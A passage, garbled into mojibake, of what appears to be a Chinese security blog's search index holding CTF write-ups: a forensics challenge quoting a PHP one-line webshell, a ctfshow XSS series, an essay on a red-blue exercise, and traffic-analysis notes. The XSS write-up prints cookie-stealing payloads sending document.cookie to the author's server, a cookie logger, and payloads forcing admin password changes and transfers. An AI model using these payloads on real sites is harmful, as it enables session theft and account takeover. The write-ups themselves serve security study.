ã€‚ï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šabcABC123ï¼‰\n  é™„ä»¶ä¸‹è½½ æå–ç ï¼ˆGAMEï¼‰å¤‡ç”¨ä¸‹è½½\n\nä¸‹è½½é™„ä»¶ï¼Œçœ‹ä¸€ä¸‹ï¼Œå…¨æ˜¯æºç ï¼Œå’±ä»¬vscæ‰“å¼€ç¿»ä¸€ç¿»\nç„¶åæŒ¨ç€ç¿»ä¹Ÿå°±ç¿»åˆ°äº†ä¸€å¥è¯æœ¨é©¬\n&lt;?php assert(@$_POST[&#39;lanmaobei666&#39;]); ?&gt;\n\nç½‘ç«™å–è¯_2\n  è¯·æäº¤æ•°æ®åº“è¿æ¥çš„æ˜æ–‡å¯†ç ã€‚ï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šabcABC123ï¼‰\n\n\npasswdæŒ‡åˆ°äº†my_encrypt()\n\næ ¹æ®æºç å¾—åˆ°è§£ç è„šæœ¬\n&lt;?phpfunction my_encrypt()&#123;    $str = &#x27;P3LMJ4uCbkFJ/RarywrCvA==&#x27;;    $str = str_replace(array(&quot;/r/n&quot;, &quot;/r&quot;, &quot;/n&quot;), &quot;&quot;, $str);    $key = &#x27;PanGuShi&#x27;;    $iv = substr(sha1($key),0,16);    $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,&quot;&quot;,MCRYPT_MODE_CBC,&quot;&quot;);    mcrypt_generic_init($td, &quot;PanGuShi&quot;, $iv);    $decode = base64_decode($str);    $dencrypted = mdecrypt_generic($td, $decode);    mcrypt_generic_deinit($td);    mcrypt_module_close($td);    $dencrypted = trim($dencrypted);    return $dencrypted;&#125;echo my_encrypt();?&gt;\n\nç»“æœKBLT123\nç½‘ç«™å–è¯_3\n  è¯·æäº¤æ•°æ®åº“é‡‘é¢åŠ å¯†æ··æ·†ä½¿ç”¨çš„ç›å€¼ã€‚ï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šabcABC123ï¼‰\n\nè¿˜æ˜¯ç¿»æºç ï¼Œå¾—åˆ°\n\nfunction decrypt($data, $key = &#39;jyzg123456&#39;)\n","tags":["wp","SkyMirror","Forensics"]},{"title":"ctfshow_xss_wp","url":"/2022/05/14/ctfshow_xss_wp/","content":"è·¨ç«™è„šæœ¬æ”»å‡»åœ¨è¿™ä¸€å¥—é¢˜ç›®ä¸­ä½“ç°çš„æ·‹æ¼“å°½è‡´ã€‚\nweb316è·¨ç«™è„šæœ¬æ”»å‡»ï¼Œç°æ—¶è·¨ç«™ï¼Œè¿™é‡Œæˆ‘ç”¨çš„è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå½“ç„¶ä¹Ÿæœ‰ç”¨å„ç§xssç½‘ç«™çš„ï¼Œ\néƒ½å·®ä¸å¤šï¼Œæ¯”å¦‚http://xsscom.com/åŠ è½½çš„è¿˜æ¯”è¾ƒå¿«ã€‚\næˆ‘ç”¨çš„è‡ªå·±æœåŠ¡å™¨ï¼Œè´´ä¸Šä¸€ä¸ªè¿™ä¸ªè„šæœ¬\n&lt;?php$cookie = $_GET[&#x27;1&#x27;];$log = fopen(&quot;flag.txt&quot;, &quot;a&quot;);fwrite($log, $cookie . &quot;\\n&quot;);fclose($log);?&gt;\n\næˆ‘è¿™é‡Œå»ºè®®æ–‡ä»¶åä¸è¦ç”¨xssï¼Œå› ä¸ºæˆ‘åˆšå¼€å§‹ç”¨çš„xssï¼Œåè¾¹ä¼šæœ‰é¢˜ç›®æŠŠxssè¿‡æ»¤äº†ã€‚\npayloadï¼š\n&lt;script&gt;window.location.href=&#39;http://è‡ªå·±æœåŠ¡å™¨IP/a.php?1=&#39;+document.cookie&lt;/script&gt;\nwindow.location.hrefå¯ä»¥ç†è§£æˆæ˜¯ï¼Œè·³è½¬åˆ°hrefé‡Œï¼Œå…·ä½“å‚è€ƒhttps://www.cnblogs.com/Qian123/p/5345298.html#_label3\ndocument.cookieå°±æ˜¯åˆ›å»ºä¸€ä¸ªcookie,è¿™é‡Œæ˜¯æŠŠç›®æ ‡cookieçªƒå–ä¸‹æ¥ï¼Œå…·ä½“å‚è€ƒhttps://www.runoob.com/jsref/prop-doc-cookie.html\nweb317-319è¿™é‡Œå±äºæ˜¯ä¸€æ‹›é²œåƒéå¤©äº†ï¼Œè¿™é‡Œè¿‡æ»¤çš„ä¸œè¥¿éƒ½ä¸ä¸€æ ·ï¼Œæœ‰imgï¼Œscriptï¼Œxss\nä½†æ˜¯payload:\n&lt;body onload=&quot;document.location.href=&#39;http://IP/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;\næ— æ•Œ\nweb320-web326è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½†æ˜¯tabæˆ–è€…/æˆ–è€…/**/éƒ½å¯ä»¥ç”¨\næ‰€ä»¥payload:\n&lt;body/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;\nweb327å¼€å§‹æ¥åˆ°å­˜å‚¨å‹XSSï¼Œéš¾åº¦èµ·æ¥äº†ã€‚\nè¿™é¢˜æ³¨æ„æ”¶ä»¶äººè¦æ˜¯admin\nç„¶åä¿¡çš„å†…å®¹è¿˜æ˜¯è€æ ·å­\n&lt;body/**/onload=&quot;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie&quot;&gt;&lt;/body&gt;\nweb328è¿™é¢˜æ‰“å¼€ä¼šå‘ç°è²Œä¼¼æ²¡æœ‰ä¼ xss payloadçš„åœ°æ–¹ï¼Œä½†æ˜¯ç»†å¿ƒçš„åŒå­¦ä¼šå‘ç°\n\nä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬æ˜¯adminï¼Œè¯´ä¸å®šå°±æ‹¿åˆ°flagäº†ï¼Œé‚£å’±ä»¬æœ‰äº†adminçš„cookieï¼Œæ˜¯ä¸æ˜¯å°±èƒ½ä¼ªè£…æˆadminå‘¢\né‚£ä¹ˆè¿˜æ˜¯æ€ä¹ˆä¼ payloadçš„é—®é¢˜ï¼Œå¯†ç ä¸ºå•¥ä¸èƒ½æ˜¯payloadï¼Œæ³¨å†Œå°±æ‹¿åˆ°cookieäº†\nè¿™é¢˜bodyä¸èƒ½ç”¨äº†ï¼Œè¿”ç’å½’çœŸï¼Œç”¨script\n&lt;script&gt;document.location.href=&#39;http://ip/a.php?1=&#39;+document.cookie;&lt;/script&gt;\n\nå¦‚æœä½ å¾ˆä¸å¹¸xåˆ°äº†è‡ªå·±ï¼Œå‡ºäº†å¤šä¸ªsessionidï¼Œé‚£ä¹ˆå°±é€‰æœ€åä¸€ä¸ª\nç„¶åæŠ“åŒ…ï¼Œæ”¹ä¸ªcookieå°±OK\n\nweb329åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œadminçš„sessionidæ¯æ¬¡ä¼šè¯éƒ½ä¼šå˜ï¼Œæ‰€ä»¥æ²¡åŠæ³•ä½¿ç”¨sessionidè¿›è¡Œç™»å½•ï¼ˆæœºå™¨äººå¥½åƒè®¾ç½®çš„æ˜¯ä¸Šå»ä¸€ä¸‹å°±ä¸‹æ¥ï¼‰ï¼Œé‚£ä¹ˆæ€è·¯å°±æ˜¯è®©æ³¨å…¥çš„XSS Payloadè‡ªåŠ¨è¯»å–æœ¬é¡µé¢çš„å¸¦æœ‰ctfshowçš„å­—æ®µå¹¶å‘åˆ°vpsä¸Šã€‚ æ³¨å†Œä¸€ä¸ªæ™®é€šè´¦å·å¹¶ç™»å½•ï¼Œä¿®æ”¹ä¸€ä¸ªæ˜¾ç¤ºå¯†ç çš„åœ°æ–¹ä¸ºctfshow&#123;123456&#125;ï¼Œç„¶åå°è¯•ç›´æ¥åœ¨consoleä¸­å°†è¿™æ®µå­—æ®µè¯»å‡ºæ¥å¹¶å‘é€åˆ°vpsä¸­ï¼Œä½¿ç”¨jQueryçš„ç±»é€‰æ‹©å™¨ï¼š\n\nç¾¤ä¸»å°±æ ¹æ®è¿™ä¸ªä¸œè¥¿å†™å‡ºæ¥äº†payloa\n&lt;script&gt;$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#39;ctf&#39;+&#39;show&#123;&#39;)&gt;-1)&#123;window.location.href=&#39;http://ip/a.php?1=&#39;+value.innerHTML;&#125;&#125;);&lt;/script&gt;\nè¿˜æ˜¯æ‹¿è¿™ä¸ªå½“ä½œå¯†ç ï¼Œå°±å¯ä»¥äº†ã€‚\nweb330ä¸Šæ¥å…ˆè¯•ä¸€æ¢­å­ä¸Šä¸€é¢˜çš„payloadï¼Œå¥½åƒå¹¶æ²¡æœ‰æˆåŠŸã€‚\nç»§ç»­çœ‹è¿™é¢˜å¤šäº†ä¸ªä¿®æ”¹å¯†ç ç•Œé¢ï¼Œé‚£ä¹ˆåªè¦è®©ç®¡ç†å‘˜ä¿®æ”¹æˆæˆ‘ä»¬çŸ¥é“çš„å¯†ç ï¼Œå°±èƒ½è§£å†³äº†\nxåˆ°ç®¡ç†å‘˜ï¼Œè¿˜æ˜¯å¾—èµ°æˆ‘ä»¬çš„å¯†ç ã€‚å…ˆæŠ“ä¸ªåŒ…çœ‹çœ‹æ”¹å¯†ç çš„api\n\n\n&lt;script&gt;window.location.href=&#39;http://127.0.0.1/api/change.php?p=123&#39;;&lt;/script&gt;\nè¿™é‡Œçš„ç”±äºxçš„æ˜¯adminï¼Œæ‰€ä»¥ç”¨äº†adminçš„æœ¬åœ°IP127.0.0.1\næ³¨å†Œï¼Œå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆç”¨ï¼Œè¯•è¯•ç”¨æˆ·åï¼Œä½ çœ‹é‚£ç”¨æˆ·åï¼Œå¾ˆé•¿ä¸€ç­ï¼Œå…¶å®ä¹‹å‰ä¸€ç›´æ²¡ç”¨ç”¨æˆ·åï¼Œæ˜¯å› ä¸ºç”¨æˆ·ååªèƒ½æ³¨å†Œä¸€æ¬¡ï¼Œä½†æ˜¯å¯†ç å¯ä»¥é‡å¤\næˆ–è€…ä¿é™©èµ·è§ï¼Œç›´æ¥ç”¨æˆ·åå¯†ç å…¨æ˜¯xss\nå¥½äº†ï¼Œadmin#123 ç™»é™†æˆåŠŸï¼Œä¸ºäº†é˜²æ­¢è‡ªåŠ¨è·³è½¬ï¼Œè¿™é‡ŒæŠ“ä¸€ä¸‹\n\n\nweb331ä¸Šæ¥ï¼Œå…ˆè¯•ä¸€è¯•ä¸Šä¸€é¢˜çš„payloadï¼Œå¥½å§ï¼Œå¹¶æ²¡æœ‰é‚£ä¹ˆå¹¸è¿\nè¿™é‡Œæ³¨æ„åˆ°urlï¼Œå‘ç°å¹¶ä¸æ˜¯getäº†ï¼Œé‚£ä¹ˆçŒœæµ‹æ˜¯postï¼ŒæŠ“åŒ…ä¸€çœ‹ï¼Œæœç„¶æ˜¯\n\nä»¿ç…§ï¼Œpostçš„æºç ï¼Œå†™ä¸ªpayloadå°±å¥½äº†\n\n\n&lt;script&gt;$.ajax(&#123;url:&#39;api/change.php&#39;,type:&#39;post&#39;,data:&#123;p:&#39;123&#39;&#125;&#125;);&lt;/script&gt;\npayloadæ¥å–½ï¼Œè§£å†³\n\nweb332å…ˆè¯•ä¸€ä¸‹ä¸Šä¸€é¢˜çš„payloadï¼Œå°±æ˜¯è¯´ï¼Œåªè¦æ‹¿åˆ°adminäº†ï¼Œä»€ä¹ˆéƒ½å¥½è¯´ï¼Œç„¶åå¤±è´¥äº†ï¼Œè½¬æ¢æ€è·¯ã€‚\nè¿™é¢˜å¾ˆç®€å•ï¼Œè¦ä¹°flagå˜›ï¼Œä½†æ˜¯é’±ä¸å¤Ÿï¼Œè¿˜æœ‰ä¸ªè½¬è´¦å£å­\nå°è¯•è½¬è´Ÿçš„ï¼Œç„¶åå°±æˆåŠŸäº†\n\nè´­ä¹°flagï¼ŒæˆåŠŸ\nè¿™é¢˜ä¹Ÿå¯ä»¥ç»™è‡ªå·±è½¬è´¦ï¼Œç„¶åä¼šå‘ç°ï¼Œç»™è‡ªå·±è½¬è´¦æ˜¯ä¸è¦é’±çš„ï¼Œç„¶åå°±å¯ä»¥ä¸€ç›´è½¬ï¼Œåªè¦é‡‘é¢å°‘äºè‡ªå·±çš„ä½™é¢å°±è¡Œã€‚\nè¿™é‡Œå°±ä¸å†æ¼”ç¤ºäº†ã€‚\nç„¶åè¿™å¥½åƒè·Ÿxssæ²¡ä»€ä¹ˆå…³ç³»ï¼Œç°åœ¨xä¸åˆ°adminçš„å¯†ç äº†ï¼Œæˆ‘ä»¬è¯•ä¸€è¯•èƒ½ä¸èƒ½ç›´æ¥xä¸€ä¸‹adminè½¬è´¦ï¼Œæˆ‘ä»¬æŠ“åŒ…çœ‹ä¸€ä¸‹è½¬è´¦çš„ä¼ å‚\n\næ”¹ä¸€ä¸‹ä¸Šä¸€é¢˜çš„payload\n&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;\næå®šå•Š\nweb333é¦–å…ˆè¯•ä¸€è¯•ä¸Šä¸€é¢˜ï¼Œç»™è‡ªå·±è½¬è´¦æ˜¯å¯è¡Œçš„ï¼Œxåˆ°adminè½¬è´¦ä¹Ÿæ˜¯å¯è¡Œçš„ã€‚\n\n&lt;script&gt;$.ajax(&#123;url:&#39;api/amount.php&#39;,type:&#39;post&#39;,data:&#123;u:&#39;123&#39;,a:&#39;10000&#39;&#125;&#125;);&lt;/script&gt;\næ€»ç»“jså¾ˆé‡è¦ï¼Œå¯ä»¥é€šè¿‡jsææ•´ä¸ªç½‘é¡µ\n","tags":["Web","XSS","wp","ctfshow"]},{"title":"é—²èŠâ€”â€”ç¬¬ä¸€æ¬¡HW","url":"/2022/08/10/hw01/","content":"æˆ‘å¾ˆå¹¸è¿ï¼Œå‚åŠ äº†2022çš„å›½å®¶hwè¡ŒåŠ¨ï¼Œ7.24-8.8 å†æ—¶åäº”å¤©ï¼Œç»“äº¤äº†ä¸€äº›åœˆå†…å¤§ä½¬\nè¯´å®è¯ï¼Œhwå¾ˆéš¾å­¦åˆ°ä¸€äº›æŠ€æœ¯æ€§çŸ¥è¯†ï¼Œå°±ç®—æœ‰ï¼Œä¹Ÿæ˜¯æ‘¸é±¼æ—¶é—²ç€æ²¡äº‹è‡ªå­¦çš„ï¼Œè¿˜æœ‰å°±æ˜¯ä¸€äº›å®‰å…¨è®¾å¤‡ä½¿ç”¨ï¼Œå¹¸è¿çš„è¯ï¼Œå¯ä»¥å­¦ä¸€äº›ç ”åˆ¤ç”šè‡³æ˜¯æº¯æºç›¸å…³çš„çŸ¥è¯†ã€‚\nhwæœ€ä¸»è¦å°±æ˜¯ç»“å®ä¸€äº›åœˆå†…å¤§ä½¬ï¼Œå»å¤§åŸå¸‚çœ‹çœ‹ï¼Œä¸å„ä¸ªå‚å•†å¤§ä½¬äº¤æµï¼Œè§è§ä¸–é¢ï¼Œå½“ç„¶å¯ä»¥æä¸€æ³¢ğŸ’´ï¼Œä½†æ˜¯ä¸€å®šè¦å°å¿ƒï¼Œä¸è¦è¢«é»‘å¿ƒä¸­ä»‹éª—äº†ã€‚\nè¿™æ¬¡hwï¼Œè¯´çš„æœ€å¤šçš„ä¸€å¥è¯æ˜¯ï¼šâ€œè¿™ğŸ•ä¸Šæµ·ï¼ŒğŸ•éƒ½ä¸æ¥ï¼ŒçœŸä¸æ˜¯äººæ´»çš„â€\nå¤–åœ°äººåœ¨ä¸Šæµ·æ˜¯çœŸçš„éš¾æ´»ï¼Œç‰¹åˆ«æ˜¯ä¸€èˆ¬çš„æ‰“å·¥äººï¼Œè¿™è¾¹çš„ç‰©ä»·æ˜¯çœŸè¦å‘½ï¼Œè€Œä¸”ä¸€è¾ˆå­ä¹Ÿä¹°ä¸èµ·ä¸Šæµ·çš„ä¸€å¥—æˆ¿ã€‚\nä¸€ä¸ªæœˆæˆ¿ç§Ÿå°±è¦2k+ï¼Œæ¯é¡¿é¥­ä¹Ÿå¾—20+ï¼Œä¸€å—æ²¹é¥¼å°±è¦å…«ä¹å—ï¼Œä¸€ç¢—è±†èŠ±ä¹Ÿè¦å…«ä¹å—\nä¸è¿‡æˆ‘åœ¨è¿™è¾¹æ´»å¾—è¿˜æ˜¯æ¯”è¾ƒæ»‹æ¶¦çš„ï¼Œå› ä¸ºæ˜¯åŒ…å·®æ—…å˜›ï¼Œæˆ‘å°±éœ€è¦åƒä¸ªé¥­èŠ±é’±ï¼Œè€Œä¸”å…¬å¸è¿˜ç»™æä¾›åƒä¸å®Œçš„é›¶é£Ÿé¥®æ–™ï¼Œå‰å‡ å¤©ä¸€å¤©è¿˜ç‚¹ä¸¤é¡¿å¤–å–ï¼Œå› ä¸ºæˆ‘æ˜¯å¤œç­å˜›ï¼Œå°±ä¸‹ç­åƒä¸€é¡¿ï¼Œä¸Šç­å‰åƒä¸€é¡¿ã€‚åˆ°äº†åè¾¹å…¬å¸é›¶é£Ÿè¶Šæ¥è¶Šä¸°ç››ï¼Œæ¯å¤©å°±åƒä¸€é¡¿ã€‚ä¸€èˆ¬æ˜¯åŠå¤œåƒï¼Œç„¶åæ—©ä¸Šåƒä¸ªæ³¡é¢æˆ–è€…å°é¢åŒ…å•¥çš„ã€‚\nå¯ä»¥æ™’ä¸€ä¸‹æˆ‘åƒçš„ä¸œè¥¿\nè¿™æ˜¯åƒçš„ä¸€äº›æ³¡é¢ï¼Œè‡ªçƒ­ç±³é¥­ä¹‹ç±»çš„\n\n\n\n\n\n\n\n\nè¿™ä¸€ä»½åœ¨æˆ‘ä»¬é—¨å£æ‘†æ”¾äº†å¥½ä¹…ï¼Œä¹Ÿæ²¡äººåƒï¼Œå¥½åƒæ˜¯ç”²æ–¹é‚£è¾¹çš„ï¼Œä¹Ÿåªæœ‰æˆ‘ä¸€ä¸ªäººåƒè¿‡ï¼Œæ„Ÿè§‰è¿˜ä¸é”™\n\n\nåè¾¹æ˜¯ä¸€äº›æ—¥å¸¸çš„é›¶é£Ÿï¼Œé¥®æ–™ï¼Œä»¥åŠäººç”Ÿç¬¬ä¸€ç“¶ç™¾å²å±±\n\n\n\n\n\n\nåœ¨è¿™è¾¹çš„å·¥ä½œæ˜¯æ¯”è¾ƒè½»æ¾çš„ï¼Œæ¯å¤©åˆ·åˆ·å¾®æ­¥ï¼Œåƒåƒé›¶é£Ÿï¼Œåšåšå·¡æ£€ï¼Œçœ‹çœ‹å‘Šè­¦\nåœ¨å¾®æ­¥ä¸Šæˆ‘ä»¬è¢«ç§°ä½œYTï¼Œé¼ æ ‡çŒ´\n\nåäº”å¤©å¾ˆå¿«ï¼Œä¸€ä¼šå°±è¿‡å»äº†ï¼Œè¿™é‡Œå¼•ç”¨å¾®æ­¥çš„ä¸€æ®µè¯\n\næ˜å¤©ä¹‹åï¼Œä½ æˆ‘å„å½’å²—ä½ã€‚å¤ªé˜³ç…§å¸¸å‡èµ·ï¼Œå°ç‹èƒŒç€åŒè‚©åŒ…æŒ¤åœ°é“ï¼Œå°æåˆåœ¨å®¢æˆ·ç°åœºé€¢ç€ä¸€ä½å¿ƒä»ªçš„å§‘å¨˜ã€‚äººæ¥è½¦å¾€ï¼Œå²æœˆé™å¥½ï¼Œä¸€åˆ‡å¦‚å¸¸ã€‚æµ·æ°´å†²åˆ·æ²™æ»©ï¼Œè¿™åäº”å¤©çš„ä¸€åˆ‡ï¼Œä»¿ä½›ä»æ¥æ²¡å‘ç”Ÿè¿‡ã€‚ä½†æ˜¯æŸä¸ªæ—¶åˆ»ï¼Œä¹Ÿè®¸ä½ æˆ‘ä¼šè®°èµ·ï¼Œæˆ‘ä»¬æ›¾å…±åŒåœ¨ä¸­å›½ç½‘ç»œç©ºé—´ç•™ä¸‹ä¸€é¡µçº¢è“è‰²çš„ç¯‡ç« ï¼Œåˆ»ä¸‹æ”»ä¸é˜²çš„ç—•è¿¹ã€‚æˆ˜æ–—æ˜¯ä¸ºäº†æ°¸ä¹…çš„å’Œå¹³ã€‚æ— è®ºå¦‚ä½•ï¼Œä¸–ç•Œå·²ç»å› ä¸ºè¿™åœºä¸è§ç¡çƒŸçš„æ¼”ä¹ è€Œæ°¸ä¹…æ€§æ”¹å˜ã€‚åŠŸæˆä¸å¿…åœ¨æˆ‘ï¼ŒåŠŸæˆå¿…å®šæœ‰æˆ‘ã€‚å…¶ä¸­æ•…äº‹ï¼Œæˆ‘ä»¬æ¥æ—¥å†ç»­ã€‚\n\n\nè¿™åäº”å¤©ï¼Œä¹Ÿæœ‰ä¸¤ä¸ªäººï¼Œè®©æˆ‘æ„Ÿåˆ°éå¸¸æ„§ç–šã€‚\nä¸€ä½æ˜¯7.30é‚£å¤©æ™šä¸Šå†’é›¨ä¸ºæˆ‘é€å¤–å–çš„éª‘æ‰‹ï¼Œä»–å› ä¸ºé€æˆ‘çš„å•ï¼Œæ·‹åäº†è‡ªå·±çš„æ‰‹æœºã€‚é‚£å¤©æ™šä¸Šé›¨å¾ˆå¤§ï¼Œæˆ‘å´æ— èƒ½ä¸ºåŠ›ã€‚\nè¿˜æœ‰ä¸€ä½å°±æ˜¯å¥¹ï¼Œå’Œæˆ‘å¼‚åœ°äº†ä¸€å¹´å¤šçš„å¥¹ï¼Œä»é«˜ä¸­åŒå­¦å˜æˆæƒ…ä¾£åˆå˜å›äº†é«˜ä¸­åŒå­¦\n7.27æ˜¯å¥¹çš„ç”Ÿæ—¥ï¼Œæˆ‘åœ¨hwï¼Œ8.4æ˜¯ä¸ƒå¤•ï¼Œæˆ‘è¿˜åœ¨hwï¼Œ8.5æˆ‘ä»¬æˆä¸ºäº†é«˜ä¸­åŒå­¦\n","tags":["HW","chat"]},{"title":"(é™‡å‰‘æ¯ 2021)iosç³»åˆ—","url":"/2022/04/29/ios_flow/","content":"ï¼ˆ1ï¼‰æ ¹æ®ç»éªŒï¼Œæ²¡æ€è·¯å°±è¿½è¸ªTCPæµ\nè¿½åˆ°15æµï¼Œä¼šå‘ç°ä¸€å¨ä¸œè¥¿ï¼Œç¿»ä¸€ç¿»å°±èƒ½å¾—åˆ°ã€‚\n\nå¾ˆæ˜æ˜¾ï¼Œ3.128.156.159\nï¼ˆ2ï¼‰è¿˜æ˜¯åˆšåˆšè¿½è¸ªçš„TCPæµ\n\né¡¹ç›®è¿æ¥éƒ½æ‘†å‡ºæ¥äº†\n\nhttps://github.com/ph4ntonn/Stowaway/\n\nå·¥å…·å°±æ˜¯stowaway\nï¼ˆ3ï¼‰è®¿é—®é¡¹ç›®è¿æ¥ï¼Œç¿»ä¸€ç¿»å¾—åˆ°äº†\n\nhack4secå°±æ˜¯å¯†æ–‡äº†\nï¼ˆ4ï¼‰ç¿»æ¥è¦†å»ï¼Œå¹¶æ²¡æœ‰æ‰¾åˆ°è·ŸSQLæ³¨å…¥æœ‰å…³çš„æ•°æ®ï¼Œä½†æ˜¯çœ‹è§äº†TLSåŠ å¯†çš„\nè§£å¯†ï¼ˆwiresharkâ¡ç¼–è¾‘â¡é¦–é€‰é¡¹â¡protocolsï¼‰ä¸€ä¸‹ï¼Œçœ‹HTTP2å‘ç°äº†SQLæ³¨å…¥çš„è¯­å¥ï¼Œå­˜ä¸‹æ¥ï¼Œç„¶åæŠŠéœ€è¦çš„æ•°æ®ç­›é€‰å‡ºæ¥ï¼Œè¿™é‡Œæˆ‘çœ‹èŠ±çœ¼äº†ï¼Œæ‰€ä»¥å†™äº†ä¸ªè„šæœ¬\nimport refile = open(&quot;1.txt&quot;,&#x27;r&#x27;)indata = file.read()obj = re.compile(r&quot;_from_user%29%3D%22(?P&lt;wahaha&gt;.*?)%22_then_id_else&quot;,re.S)result = obj.finditer(indata)for it in result :    print(it.group(&quot;wahaha&quot;))\n\nç„¶åå¾—åˆ°çš„æ•°æ®ï¼Œhexè§£ç ä¸€ä¸‹ï¼Œå°±èƒ½å¾—åˆ°\n\n746558f-c841-456b-85d7-d6c0f2edabb2\n\nï¼ˆ5ï¼‰ä¸¤ç§åŠæ³•ï¼Œç¬¬ä¸€ç§å¾ˆç¬¨ï¼Œå°±æ˜¯ç”¨wiresharkè¿‡æ»¤ï¼Œå€ŸåŠ©\n\ntcp.port == n\n\nå‘ç°10-499æ˜¯æœ‰æ•°æ®çš„\n\n\nç¬¬äºŒç§å‚è€ƒäº†é›ªæ®‡çš„wpï¼ŒTCP dumpä¸€ä¸‹\n\ntcpdump -n -r triffic.pcap | awk â€˜{print $3}â€™ | sort -u &gt; ou1t.txt\n\n\nï¼ˆ7ï¼‰çœ‹ä¸€çœ¼access.log,å¾ˆæ˜æ˜¾\n\nå†ç»“åˆï¼ˆ4ï¼‰æˆ–è€…ï¼ˆ5ï¼‰éƒ½èƒ½å¾—åˆ°192.168.1.12\nï¼ˆ8ï¼‰çœ‹æ—¥å¿—ï¼Œæ˜æ˜¾ã€‚\n\nwebshellç‰¹å¾ï¼Œæ‰€ä»¥å¯†ç ä¸ºfxxk\n","tags":["wp","flow","Misc"]},{"title":"Misc_æµé‡åˆ†æ_åŸºç¡€","url":"/2022/06/17/misc_flow/","content":"ä¸èƒ½é¸½äº†ï¼Œä»è€ƒè¯•å‘¨ï¼Œé¸½åˆ°ç°åœ¨ï¼Œæ–°å»ºæ–‡ä»¶å¤¹åŠä¸ªæœˆäº†ï¼Œä»Šå¤©å¿…å†™å‡ºæ¥\nå¼€å§‹å’±ä»¬å…ˆè¯´ç‚¹æµé‡åˆ†æå¸¸è§çš„é¢˜ç›®ã€‚\nflagèƒ½ç›´æ¥æ‰¾åˆ°è¿™éƒ¨åˆ†é¢˜å¯èƒ½å°±éš¾åœ¨è°æœ‰è€å¿ƒå§ï¼Œæœ€ç®€å•çš„å°±æ˜¯é€šè¿‡flagæŸ¥æ‰¾å·¥å…·ï¼Œç›´æ¥æ‰¾åˆ°flagï¼Œæˆ–è€…æ˜¯é€šè¿‡å¸¸è§ç¼–ç åçš„flag\nå¸¸è§çš„æœ‰è¿™å‡ ç§\n\n#é»˜è®¤å­—ç¬¦å…³é”®å­—flag,666c6167,Zmxh,&amp;#102,464C4147\n#é»˜è®¤æ­£åˆ™å…³é”®å­—flag{.+},666c6167\\w+,Zmxh[\\w=]+,&amp;#102.+\n#å…¶ä»–å…³é”®å­—key,ctf,f1ag,ffllaagg,f-l-a-g\n#flagäºŒè¿›åˆ¶æ ¼å¼1100110011011000110000101100111\n#æ­£åˆ™ç¼–ç ç±»key{.},ctf{.},f1ag{.*}\n#æ­£åˆ™åŒ¹é…ä¸­æ–‡[\\u4E00-\\u9FA5]+\n#ç™¾é‡ŒæŒ‘ä¸€æ­£åˆ™.[a-f1234567890]{17}}\n#ipæ­£åˆ™\\d+.\\d+.\\d+.\\d+\n#flagåå†™{.*}galf\n#å®‰æ’dasctf\ncyberpeace{.*} \n\nè¿˜æœ‰ä¸€äº›æµé‡åŒ…ä¸œè¥¿å¾ˆæ‚ï¼Œä¸€æ¡æ¡ç¿»å¤ªæ…¢äº†ï¼Œå¯ä»¥åœ¨è·‘ä¸€ä¸‹stringï¼Œå°±ä¸€ç›®äº†ç„¶\nè¿˜æœ‰ä¸€äº›å°±æ˜¯flagåˆ†æ®µçš„ï¼Œå¯èƒ½æ¯ä¸ªå­—æ¯éƒ½åœ¨ä¸åŒçš„åŒ…ä¸­ï¼Œä¹Ÿå¯èƒ½åˆ†æˆäº†å‡ æ®µã€‚\nè¿™ä¸€å—ä¸­ï¼Œæ¯”è¾ƒéš¾çš„å°±æ˜¯ç¼–ç ä¸å¸¸è§çš„ï¼Œé‚£ç©æ„çœ‹è§äº†éƒ½ä¸ä¸€å®šèƒ½çŒœåˆ°é‚£æ˜¯flagï¼Œæ›´ä½•å†µä»–å†è—å¾—æ·±ä¸€ç‚¹ï¼Œåƒç¬¬äºŒå±Šç½‘åˆƒæ¯çš„\nncsubjã€xyp07å’Œcryptolalia\nè¿™ä¸ªxyp07å¾ˆå¥‡å¦™ï¼Œæ‹¿ç§‘è±ä¸€è·‘å°±å‡ºæ¥äº†ã€‚\ncryptolaliaéå¯¹ç§°åŠ å¯†ï¼Œè¿™ä¸ªçœ‹å‡ºæ¥éœ€è¦ä¸€å®šçš„ç»éªŒã€‚\nèƒ½ä»æµé‡åŒ…ä¸­æå–å‡ºæ–‡ä»¶çš„è¿™ä¸€å—å¤§éƒ¨åˆ†éƒ½èƒ½é€šè¿‡å¯¼å‡ºæ–‡ä»¶è¿™ä¸€æ“ä½œæ¥å®ç°ï¼Œå½“ç„¶æœ‰äº›æ—¶å€™ç”¨binwalkæˆ–è€…æ˜¯formoståˆ†ç¦»å‡ºæ¥ï¼Œå¦‚æœè¿™ä¸ªæ–‡ä»¶æ˜¯åœ¨æµé‡åŒ…ä¸­çš„ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªå·¥å…·æå–å¯èƒ½æ²¡æœ‰é‚£ä¹ˆé¡ºåˆ©ï¼Œæ¯”å¦‚è¯´ä¸€ä¸ªå›¾ç‰‡å¯èƒ½èƒ½æå‡ºæ¥ï¼Œä½†æ˜¯æŸåäº†ï¼Œè¿™æ 